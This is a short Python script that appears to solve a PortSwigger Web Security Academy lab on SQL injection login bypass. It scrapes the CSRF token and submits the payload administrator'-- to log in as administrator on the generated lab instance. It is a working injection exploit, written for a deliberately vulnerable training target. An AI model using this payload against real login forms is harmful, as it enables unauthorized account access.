#!/usr/bin/env python

'''This lab contains an SQL injection vulnerability in the login function.
To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.

Lab Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
'''

import requests
from bs4 import BeautifulSoup


s = requests.session()

lab_id = '0a0800f5038ee6ccc0246b70007900af' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 
soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #csrf token


data = { 'username' : "administrator'--",
        'password' : 'l',
        'csrf': token
}

r2 = s.post(uri, data=data)
if "Your username is: administrator" in r2.text:
    print("solved")
else:
    print("nope")
